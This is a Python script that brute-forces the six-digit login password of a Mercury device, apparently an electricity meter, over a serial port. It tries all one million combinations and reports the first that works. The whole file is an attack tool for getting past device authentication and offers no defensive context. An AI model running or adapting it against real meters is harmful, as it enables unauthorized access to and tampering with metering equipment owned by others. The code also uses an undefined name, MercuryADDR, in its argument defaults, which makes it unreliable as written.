import argparse
import serial
import struct
import time
import logging

from mercury.mercury import MercuryDriver

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO
)


def progressbar(position, max, end=""):
    """
    Draws a progress bar in CLI
    """
    max_v = max - 1
    progressbarlen = 50
    progressbarcurpos = int(position / max_v * progressbarlen)
    progressbarpercent = int(position / max_v * 100)
    print(
        f'\r[ {"#" *  progressbarcurpos}{"-" * (progressbarlen-progressbarcurpos)} ] {progressbarpercent}%\t{end}',
        end="",
        flush=True,
    )


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "serial", type=str, nargs="?", default=0, help="Serial port. e.g. USB4"
    )
    parser.add_argument(
        "sn", type=int, nargs="?", default=MercuryADDR.UNIVERSAL, help="address"
    )
    args = parser.parse_args()
    return args


def main():
    args = parse_args()
    com = args.serial
    sn = args.sn

    counter = MercuryDriver(com, sn)
    counter.test_connection()
    counter.logout()

    passwords = range(0, 1000000)
    MAX = len(passwords)
    logging.info(f"Trying {MAX} passwords:")
    progressbar(0, MAX, "")
    for pos, psw in enumerate(passwords):
        psw_s = str(psw).zfill(6)
        progressbar(pos, MAX, psw_s)
        if counter.login(psw=psw):
            logging.info(f"Login successful with {psw_s}")
            break
    counter.logout()
    logging.info("Done.")


if __name__ == "__main__":
    main()
